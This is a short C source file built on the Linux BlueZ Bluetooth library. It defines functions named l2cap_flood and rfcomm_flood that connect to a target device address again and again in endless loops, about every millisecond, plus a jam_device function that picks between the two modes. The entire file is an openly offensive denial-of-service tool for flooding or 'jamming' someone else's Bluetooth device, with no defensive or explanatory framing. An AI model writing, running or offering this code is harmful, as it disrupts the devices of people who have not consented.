#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

void l2cap_flood(const bdaddr_t* target) {
    int sock;
    struct sockaddr_l2 addr = { 0 };
    addr.l2_family = AF_BLUETOOTH;
    bacpy(&addr.l2_bdaddr, target);
    addr.l2_psm = htobs(0x0001);
    while (1) {
        sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (sock < 0) continue;
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            printf("L2CAP flood sent!\n");
        }
        
        close(sock);
        usleep(1000);
    }
}

void rfcomm_flood(const bdaddr_t* target) {
    int sock;
    struct sockaddr_rc addr = { 0 };
    addr.rc_family = AF_BLUETOOTH;
    bacpy(&addr.rc_bdaddr, target);
    addr.rc_channel = 1;

    while (1) {
        sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        if (sock < 0) continue;
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            printf("RFCOMM flood sent!\n");
        }
        close(sock);
        usleep(1000);
    }
}
void jam_device(const bdaddr_t* target, int mode) {
    if (mode == 1) {
        l2cap_flood(target);
    } else if (mode == 2) {
        rfcomm_flood(target);
    } else {
        printf("Invalid mode!\n");
    }
}
